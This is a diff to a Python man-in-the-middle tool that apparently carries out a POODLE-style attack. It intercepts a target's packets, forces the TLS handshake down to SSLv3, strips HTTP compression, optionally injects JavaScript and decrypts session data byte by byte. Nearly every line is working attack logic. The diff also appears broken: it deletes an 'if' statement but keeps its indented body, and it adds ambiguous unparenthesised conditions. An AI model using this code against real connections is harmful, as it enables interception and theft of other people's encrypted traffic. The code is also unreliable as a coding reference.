@@ -101,7 +101,7 @@ with output(output_type='list', initial_len=6) as output_list:
 			output_list[5] = "Average number of requests: N/A"
 
 	def update_state_progress():
-		output_list[0] = "Block Size: {}, POST Request length: {}, OPTION Request length: {}".format(block_size, post_request_length, option_request_length)
+		output_list[0] = "Block Size: {}, POST Request length: {}".format(block_size, post_request_length) + (", OPTION Request length: {}".format(option_request_length) if config["skipOptions"] else "")
 		current_index = get_current_index()
 		try:
 			output_list[1] = "Working on decrypting byte {} - Request #{}".format(current_index, number_of_requests[current_index])
@@ -126,7 +126,9 @@ with output(output_type='list', initial_len=6) as output_list:
 
 		pkt = IP(packet.get_payload())
 
-		if HTTP in pkt:
+    # Javacript HTTP injection not quite working
+    # TODO: Fix
+		if HTTP in pkt and config['injectJS']:
 
 			# On outgoing HTTP requests, make sure there is no compression or caching
 			if pkt.src == config['target']:
@@ -182,8 +184,6 @@ with output(output_type='list', initial_len=6) as output_list:
 		if DEBUG and pkt.src == config['target'] and pkt.dst == server_ip and pkt.haslayer(TLS):
 			log("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
 
-		if pkt.src == config['target'] and pkt.dst == server_ip and TCP in pkt:
-
 			# TLS Downgrade
 			if TLS in pkt and get_field(pkt['TLS'], 'version') != 'SSLv3':
 				# Change the client handshake to offer SSLv3
@@ -216,7 +216,7 @@ with output(output_type='list', initial_len=6) as output_list:
 			if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":
 
 				# Don't modify pre-flight check
-				if option_request_length is None or (post_request_length is not None and len(pkt) < post_request_length):
+				if config["skipOptions"] and option_request_length is None or (post_request_length is not None and len(pkt) < post_request_length):
 					log("Skipping OPTION Request")
 					if option_request_length is None:
 						log("OPTION Request Length: " + str(len(pkt)))
@@ -263,13 +263,6 @@ with output(output_type='list', initial_len=6) as output_list:
 
 		elif pkt.src == server_ip and pkt.dst == config['target'] and 'TLS' in pkt and block_size is not None:
 
-			# TLS Downgrade
-			#if get_field(pkt.getlayer(TLS), 'type') == "application_data" and get_field(pkt['TLS'], 'version') != 'SSLv3' and pkt.src == server_ip:
-			#	print("Downgrading server packet")
-			#	# Change handshake status to failed
-			#	modify_and_send_packet(packet, pkt)
-			#	return
-
 			# If we get success (data instead of alert), do math to get byte
 			if get_field(pkt.getlayer(TLS), 'type') == "application_data" and pkt['TCP'].dport in sessions:
 
@@ -280,7 +273,7 @@ with output(output_type='list', initial_len=6) as output_list:
 					return
 
 				# Ignore response to pre-flight check
-				if option_response_length is None or len(pkt) == option_response_length:
+				if config["skipOptions"] and option_response_length is None or len(pkt) == option_response_length:
 					log("Skipping OPTION Response")
 					if option_response_length is None:
 						log("OPTION Response length: " + str(len(pkt)))
